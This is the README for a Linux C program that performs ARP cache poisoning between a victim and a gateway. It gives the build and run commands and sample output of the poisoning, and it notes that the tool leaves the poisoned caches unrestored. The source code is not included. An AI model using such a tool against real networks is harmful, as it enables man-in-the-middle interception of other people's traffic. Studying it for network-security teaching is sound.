# ARP Spoofing

C program performing ARP cache poisoning (works on Linux).

Program:

- obtains MAC addresses of remote hosts with ARP requests
- sends gratuitous ARP reply packets with local MAC address

Program doesn't restore ARP caches of remote hosts.

## Disclaimer

This is for educational purposes only. I DO NOT encourage or promote any illegal activities.

## Usage

```
$ sudo ./a.out <iface name> <vitcim's IP> <gateway's IP> 
```

Example:

```
$ gcc -Wall arp_spoof.c
$ sudo ./a.out eth0 192.168.8.100 192.168.8.1
Linux ARP spoofer
-----------------
Looking for MAC addresses...
Local MAC address is aa:bb:cc:dd:ee:ff
Local IP address is 192.168.8.101
Victim's (192.168.8.100) MAC address: 11:22:33:44:55:66
Gateway's (192.168.8.1) MAC address: ff:ee:dd:cc:bb:aa
Poisoning...
Sent ARP reply to victim
Sent ARP reply to gateway
Sent ARP reply to victim
Sent ARP reply to gateway
^C
```

Ctrl + C to stop